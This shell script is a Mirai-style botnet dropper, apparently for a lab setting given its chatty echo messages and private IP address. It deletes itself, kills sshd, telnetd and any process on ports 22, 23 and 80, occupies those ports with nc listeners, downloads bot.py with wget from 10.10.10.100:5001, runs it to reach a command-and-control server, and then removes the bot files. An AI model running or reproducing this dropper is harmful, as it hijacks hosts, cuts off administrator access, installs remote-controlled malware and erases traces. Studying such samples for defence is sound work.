#!/bin/sh
rm -- "$0"

echo "Mirai"

echo "> Looking for my siblings..."
sleep 1
if pgrep bot.py; then
    echo "[!] One of my siblings is already running! Committing harakiri."
else
    echo "[✓] No siblings found. My MIRAI is bright!"
    sleep 1

    echo "> Looking for other competing malwares..."
    sleep 1

    echo "> Killing competing malwares..."
    sleep 1

    echo "> Looking for processes holding ports 22, 23 and 80..."
    sleep 1

    # Kill all the processes that could hold 22 or 23
    systemctl stop sshd.socket 2&>/dev/null && echo "[✓] Killed sshd." || echo "[i] No sshd process running."

    pkill telnetd && echo "[✓] Killed telnetd." || echo "[i] No telnetd process running."

    for port in {22,23,80}; do
        if lsof -i :$port > /dev/null; then
            for pid in $(lsof -i :$port -Fp | sed 's/p//g'); do
                echo -n "[i] Found" $pid
                kill -9 $pid && echo -e "\r[✓] Killed" $pid
            done
        else
            echo "[i] No processes on port $port to kill."
        fi
    done

    # Take up ports
    echo "> Taking up ports 22, 23 e 80..."
    nc -l 22 &
    nc -l 23 &
    nc -l 80 &
    sleep 5

    echo "> Downloading malware..."
    wget 10.10.10.100:5001/bot-py -O bot.py

    echo "> Connecting to CNC server..."
    python3 bot.py &
    sleep 5
fi

echo "> Deleting bot files from memory..."
fd 'bot' --exec echo
fd 'bot' --exec rm
